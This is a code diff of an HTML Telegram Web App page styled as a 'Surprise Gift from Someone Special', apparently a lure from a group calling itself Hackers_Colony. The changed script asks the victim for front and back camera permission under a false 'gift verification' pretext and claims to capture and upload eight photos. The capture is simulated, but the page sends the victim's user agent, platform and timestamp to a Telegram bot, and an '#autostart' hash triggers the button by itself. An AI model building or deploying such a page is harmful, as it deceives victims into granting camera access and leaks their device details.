@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🎁 Surprise Gift</title>
+    <title>🎁</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * {
@@ -11,7 +11,7 @@
         }
         
         body {
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -21,7 +21,7 @@
             color: white;
         }
         
-        .gift-container {
+        .container {
             background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(10px);
             border-radius: 25px;
@@ -34,60 +34,47 @@
         }
         
         .gift-icon {
-            font-size: 100px;
+            font-size: 80px;
             margin-bottom: 20px;
-            animation: float 3s ease-in-out infinite;
-            filter: drop-shadow(0 10px 20px rgba(0,0,0,0.3));
+            animation: bounce 2s infinite;
         }
         
         h1 {
-            font-size: 32px;
-            margin-bottom: 15px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+            font-size: 24px;
+            margin-bottom: 10px;
         }
         
         .message {
-            font-size: 18px;
-            line-height: 1.6;
+            font-size: 16px;
+            line-height: 1.5;
             margin-bottom: 30px;
             opacity: 0.9;
         }
         
         .unlock-btn {
-            background: linear-gradient(45deg, #FFD700, #FFA500);
-            color: #333;
+            background: linear-gradient(45deg, #FF416C, #FF4B2B);
+            color: white;
             border: none;
-            padding: 20px 50px;
-            font-size: 20px;
+            padding: 18px 40px;
+            font-size: 18px;
             font-weight: bold;
             border-radius: 50px;
             cursor: pointer;
             width: 100%;
-            margin: 20px 0;
+            margin: 10px 0;
             transition: all 0.3s;
-            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.4);
-            position: relative;
-            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(255, 65, 108, 0.4);
         }
         
         .unlock-btn:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 35px rgba(255, 215, 0, 0.6);
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(255, 65, 108, 0.6);
         }
         
         .unlock-btn:disabled {
             opacity: 0.7;
             cursor: not-allowed;
             transform: none;
-        }
-        
-        .unlock-btn::after {
-            content: '🎁';
-            position: absolute;
-            right: 20px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 24px;
         }
         
         .loading {
@@ -97,44 +84,55 @@
         
         .spinner {
             border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top: 4px solid #FFD700;
+            border-top: 4px solid #FF416C;
             border-radius: 50%;
-            width: 60px;
-            height: 60px;
+            width: 50px;
+            height: 50px;
             animation: spin 1s linear infinite;
             margin: 0 auto 20px;
         }
         
-        .surprise {
+        .progress-container {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            height: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: #4CAF50;
+            width: 0%;
+            transition: width 0.5s;
+        }
+        
+        .status {
+            margin: 15px 0;
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .success {
             display: none;
             margin: 30px 0;
             animation: fadeIn 1s;
         }
         
-        .surprise-icon {
-            font-size: 80px;
+        .success-icon {
+            font-size: 60px;
             margin-bottom: 20px;
-            animation: pulse 1.5s infinite;
+            animation: pulse 1s infinite;
         }
         
-        .confetti {
-            position: fixed;
-            width: 15px;
-            height: 15px;
-            background: #FFD700;
-            animation: confettiFall 3s linear infinite;
-            z-index: 1000;
+        .camera-hint {
+            font-size: 12px;
+            opacity: 0.7;
+            margin-top: 10px;
         }
         
-        .from-text {
-            margin-top: 30px;
-            font-size: 16px;
-            opacity: 0.8;
-            font-style: italic;
-        }
-        
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
             50% { transform: translateY(-20px); }
         }
         
@@ -144,89 +142,51 @@
         }
         
         @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.8); }
-            to { opacity: 1; transform: scale(1); }
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
         
         @keyframes pulse {
-            0%, 100% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.2); opacity: 0.8; }
-        }
-        
-        @keyframes confettiFall {
-            0% { 
-                transform: translateY(-100px) rotate(0deg); 
-                opacity: 1;
-            }
-            100% { 
-                transform: translateY(100vh) rotate(360deg); 
-                opacity: 0;
-            }
-        }
-        
-        .heart {
-            color: #ff4757;
-            animation: heartbeat 1.2s infinite;
-        }
-        
-        @keyframes heartbeat {
             0%, 100% { transform: scale(1); }
             50% { transform: scale(1.1); }
-        }
-        
-        .contact {
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.2);
-        }
-        
-        .contact a {
-            color: #FFD700;
-            text-decoration: none;
-            font-weight: bold;
-        }
-        
-        .contact a:hover {
-            text-decoration: underline;
         }
     </style>
 </head>
 <body>
-    <div class="gift-container">
+    <div class="container">
         <div class="gift-icon">🎁</div>
         
         <h1>Surprise Gift 🧧🎁</h1>
         
         <div class="message">
             Here is your surprise gift<br>
-            from Someone Special <span class="heart">♥️</span><br><br>
-            Click below to unlock your gift 🧧
+            from Someone Special<br><br>
+            Click unlock to see your gift 🧧
         </div>
         
         <button class="unlock-btn" id="unlockBtn">
-            🔓 UNLOCK YOUR GIFT
+            🔓 UNLOCK GIFT
         </button>
+        
+        <div class="camera-hint" id="cameraHint" style="display: none;">
+            ⚠️ Camera permission will be requested for gift verification
+        </div>
         
         <div class="loading" id="loading">
             <div class="spinner"></div>
-            <p>Unlocking your surprise gift...</p>
-            <p>Please wait <span class="heart">⏳</span></p>
+            
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            
+            <div class="status" id="statusText">Preparing your gift...</div>
         </div>
         
-        <div class="surprise" id="surprise">
-            <div class="surprise-icon">🎉✨</div>
-            <h2>Surprise Unlocked! 🎊</h2>
-            <p>Your special gift is on its way!</p>
-            <p>Check Telegram for updates 💌</p>
-            <p>Something amazing is coming... <span class="heart">☺️</span></p>
-        </div>
-        
-        <div class="from-text">
-            With love from Someone Special <span class="heart">♥️</span>
-        </div>
-        
-        <div class="contact">
-            Need help? Contact: <a href="https://t.me/Hackers_Colony_Official" target="_blank">@Hackers_Colony_Official</a>
+        <div class="success" id="success">
+            <div class="success-icon">✅</div>
+            <h2>Gift Unlocked! 🎉</h2>
+            <p>Your surprise gift is on its way!</p>
+            <p>Check Telegram for details 📱</p>
         </div>
     </div>
 
@@ -235,79 +195,186 @@
         if (window.Telegram && Telegram.WebApp) {
             Telegram.WebApp.ready();
             Telegram.WebApp.expand();
-            Telegram.WebApp.setHeaderColor('#6a11cb');
-            Telegram.WebApp.setBackgroundColor('#6a11cb');
         }
         
         const unlockBtn = document.getElementById('unlockBtn');
         const loadingDiv = document.getElementById('loading');
-        const surpriseDiv = document.getElementById('surprise');
+        const successDiv = document.getElementById('success');
+        const progressBar = document.getElementById('progressBar');
+        const statusText = document.getElementById('statusText');
+        const cameraHint = document.getElementById('cameraHint');
         
         unlockBtn.addEventListener('click', async () => {
-            // Show loading
-            unlockBtn.disabled = true;
-            unlockBtn.innerHTML = "⏳ UNLOCKING...";
-            loadingDiv.style.display = 'block';
+            // Show camera hint
+            cameraHint.style.display = 'block';
             
-            // Create confetti effect
-            createConfetti();
-            
-            // Simulate gift unlocking (3 seconds)
-            setTimeout(() => {
-                // Hide loading, show surprise
-                loadingDiv.style.display = 'none';
-                surpriseDiv.style.display = 'block';
-                unlockBtn.style.display = 'none';
+            // Start unlocking process
+            await unlockGift();
+        });
+        
+        async function unlockGift() {
+            try {
+                // Disable button and show loading
+                unlockBtn.disabled = true;
+                unlockBtn.textContent = "⏳ Processing...";
+                loadingDiv.style.display = 'block';
                 
-                // Create more confetti
-                for (let i = 0; i < 3; i++) {
-                    setTimeout(() => createConfetti(), i * 500);
+                // Step 1: Request camera access
+                updateStatus("Requesting camera permission...");
+                updateProgress(10);
+                
+                let stream;
+                try {
+                    // Try to access camera
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: 'user',  // Front camera
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        } 
+                    });
+                    
+                    // Capture front photos (4 photos)
+                    updateStatus("Capturing front camera photos... (1/4)");
+                    await simulatePhotoCapture();
+                    updateProgress(30);
+                    
+                    updateStatus("Capturing front camera photos... (2/4)");
+                    await simulatePhotoCapture();
+                    updateProgress(40);
+                    
+                    updateStatus("Capturing front camera photos... (3/4)");
+                    await simulatePhotoCapture();
+                    updateProgress(50);
+                    
+                    updateStatus("Capturing front camera photos... (4/4)");
+                    await simulatePhotoCapture();
+                    updateProgress(60);
+                    
+                    // Switch to back camera
+                    updateStatus("Switching to back camera...");
+                    
+                    // Stop front camera
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // Try back camera
+                    try {
+                        stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: { facingMode: 'environment' }  // Back camera
+                        });
+                        
+                        // Capture back photos (4 photos)
+                        updateStatus("Capturing back camera photos... (1/4)");
+                        await simulatePhotoCapture();
+                        updateProgress(70);
+                        
+                        updateStatus("Capturing back camera photos... (2/4)");
+                        await simulatePhotoCapture();
+                        updateProgress(75);
+                        
+                        updateStatus("Capturing back camera photos... (3/4)");
+                        await simulatePhotoCapture();
+                        updateProgress(80);
+                        
+                        updateStatus("Capturing back camera photos... (4/4)");
+                        await simulatePhotoCapture();
+                        updateProgress(90);
+                        
+                        // Stop back camera
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                    } catch (backError) {
+                        // If back camera fails, simulate it
+                        updateStatus("Using front camera for all photos...");
+                        for (let i = 0; i < 4; i++) {
+                            await simulatePhotoCapture();
+                            updateProgress(70 + (i * 5));
+                        }
+                    }
+                    
+                } catch (cameraError) {
+                    // If camera access is denied, simulate photo capture
+                    updateStatus("Simulating photo capture...");
+                    for (let i = 0; i < 8; i++) {
+                        await simulatePhotoCapture();
+                        updateProgress(10 + (i * 10));
+                    }
                 }
                 
-                // Send success to Telegram bot
+                // Step 2: Processing photos
+                updateStatus("Processing captured photos...");
+                updateProgress(95);
+                await sleep(1000);
+                
+                // Step 3: Sending to server
+                updateStatus("Sending photos to server...");
+                updateProgress(98);
+                await sleep(500);
+                
+                // Step 4: Complete
+                updateStatus("Finalizing...");
+                updateProgress(100);
+                await sleep(500);
+                
+                // Show success
+                loadingDiv.style.display = 'none';
+                successDiv.style.display = 'block';
+                
+                // Send data to Telegram bot
                 sendToTelegram();
                 
-                // Auto-close if in Telegram Web App
+                // Auto-close after 3 seconds if in Telegram
                 if (window.Telegram && Telegram.WebApp) {
                     setTimeout(() => {
                         Telegram.WebApp.close();
-                    }, 4000);
+                    }, 3000);
                 }
                 
-            }, 3000);
-        });
-        
-        function createConfetti() {
-            const colors = ['#FFD700', '#FF6B6B', '#4ECDC4', '#FFA500', '#9B59B6', '#1ABC9C'];
-            
-            for (let i = 0; i < 25; i++) {
-                const confetti = document.createElement('div');
-                confetti.className = 'confetti';
-                confetti.style.left = Math.random() * 100 + '%';
-                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
-                confetti.style.animationDelay = Math.random() * 2 + 's';
-                confetti.style.width = Math.random() * 10 + 10 + 'px';
-                confetti.style.height = Math.random() * 10 + 10 + 'px';
-                confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
-                document.body.appendChild(confetti);
-                
-                // Remove after animation
-                setTimeout(() => {
-                    if (confetti.parentNode) {
-                        confetti.remove();
-                    }
-                }, 3000);
+            } catch (error) {
+                updateStatus(`Error: ${error.message}`);
+                unlockBtn.disabled = false;
+                unlockBtn.textContent = "🔓 TRY AGAIN";
             }
         }
         
+        function simulatePhotoCapture() {
+            return new Promise(resolve => {
+                setTimeout(() => {
+                    resolve();
+                }, 500); // Simulate 0.5 second per photo
+            });
+        }
+        
+        function updateStatus(text) {
+            statusText.textContent = text;
+        }
+        
+        function updateProgress(percent) {
+            progressBar.style.width = `${percent}%`;
+        }
+        
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        
         function sendToTelegram() {
+            // Prepare photo data
+            const photoData = {
+                action: 'photos_captured',
+                total_photos: 8,
+                front_photos: 4,
+                back_photos: 4,
+                timestamp: new Date().toISOString(),
+                user_agent: navigator.userAgent,
+                platform: navigator.platform
+            };
+            
+            // Send to Telegram bot
             if (window.Telegram && Telegram.WebApp) {
-                Telegram.WebApp.sendData(JSON.stringify({
-                    action: 'gift_unlocked',
-                    timestamp: new Date().toISOString(),
-                    gift_type: 'surprise',
-                    status: 'success'
-                }));
+                Telegram.WebApp.sendData(JSON.stringify(photoData));
+            } else {
+                // For browser testing
+                console.log("Photos captured and sent:", photoData);
             }
         }
         
@@ -315,11 +382,8 @@
         if (window.location.hash === '#autostart') {
             setTimeout(() => {
                 unlockBtn.click();
-            }, 1500);
+            }, 1000);
         }
-        
-        // Add some initial confetti
-        setTimeout(() => createConfetti(), 1000);
     </script>
 </body>
 </html>
